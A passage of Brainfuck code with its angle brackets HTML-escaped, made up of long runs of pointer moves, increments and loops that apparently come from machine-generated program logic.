gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;[&lt;&lt;+&gt;&gt;-]&lt;[&lt;[&lt;+&gt;-]&gt;-[&lt;+&gt;-]&lt;]&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-]&gt;&gt;[-]&lt;[-]--------[++++++++&lt;&lt;[-]&lt;[-]&lt;[-]&lt;[-]&lt;[-]++&lt;&lt;[-&gt;&gt;-[&gt;+&gt;&gt;+&lt;&lt;&lt;-]&gt;[&lt;+&gt;-]&gt;&gt;&gt;&gt;+&lt;&lt;-[&lt;+&lt;&lt;++&gt;&gt;&gt;&gt;&gt;--&lt;&lt;+]&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;[-]++&lt;[-&gt;-[&gt;+&gt;&gt;+&lt;&lt;&lt;-]&gt;[&lt;+&gt;-]&gt;&gt;&gt;+&lt;-[&gt;--&lt;&lt;+&lt;&lt;++&gt;&gt;&gt;+]&lt;&lt;&lt;&lt;]&gt;&gt;&gt;[&lt;&lt;&lt;+&gt;&gt;&gt;-]&gt;&gt;[&gt;-&lt;-]&gt;[[-]&lt;&lt;+&gt;&gt;]&gt;[&lt;+&lt;+&gt;&gt;-]&lt;[&gt;+&lt;-]&lt;[&lt;[&lt;+&gt;-]&lt;[&gt;++&lt;-]&gt;&gt;-]&lt;[&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;-------]&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;[-]&lt;[&gt;+&lt;-]&lt;+[&gt;+&lt;-]&lt;-[&gt;+&lt;-]&gt;]&gt;&gt;&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;[&lt;&lt;+&gt;&gt;-]&lt;[&lt;[&lt;+&gt;-]&gt;-[&lt;+&gt;-]&lt;]&lt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-][-]&gt;[-]++++++[&lt;++++++&gt;-]&lt;&gt;&lt;&lt;&gt;&gt;[-]&gt;[-]&lt;&lt;[&gt;[-]&lt;&lt;[&gt;&gt;+&gt;+&lt;&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]+&gt;[[-]&lt;-&lt;&lt;-&gt;&gt;&gt;]&lt;&lt;-]&lt;[-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]&lt;&lt;][-]&gt;&lt;&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-][-]&gt;[-]++++[&lt;++++++++&gt;-]&lt;&gt;&lt;&lt;&gt;&gt;[-]&gt;[-]&lt;&lt;[&gt;[-]&lt;&lt;[&gt;&gt;+&gt;+&lt;&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]+&gt;[[-]&lt;-&lt;&lt;-&gt;&gt;&gt;]&lt;&lt;-]&lt;[-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]&lt;&lt;[[-]+++++&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&gt;[&lt;+&gt;-][-]&lt;[&gt;&gt;[-]+&lt;[&gt;+&lt;-]&lt;-[&gt;+&lt;-]&gt;]&gt;&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;[&lt;&lt;+&gt;&gt;-]&lt;[&lt;[&lt;+&gt;-]&gt;-[&lt;+&gt;-]&lt;][-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-][-]&lt;[&gt;&gt;[-]+&lt;[&gt;+&lt;-]&lt;-[&gt;+&lt;-]&gt;]&gt;&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;[&lt;&lt;+&gt;&gt;-]&lt;[&lt;[&lt;+&gt;-]&gt;-[&lt;+&gt;-]&lt;]&lt;&lt;[-&gt;-&lt;]&gt;[&lt;+&gt;[-]]&lt;[&gt;&gt;[-]&gt;&lt;&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;&lt;&lt;[-]][-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&